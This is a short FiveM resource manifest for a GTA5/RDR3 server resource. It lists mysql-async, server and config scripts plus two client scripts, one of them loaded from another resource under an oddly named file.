fx_version 'adamant'
games { 'gta5', 'rdr3' }

server_script {
    '@mysql-async/lib/MySQL.lua',
    'server/server.lua',
    'config.lua'
}


client_script '@renameit/xDxDxDxDxD.lua'

client_script 'Adastra.lua'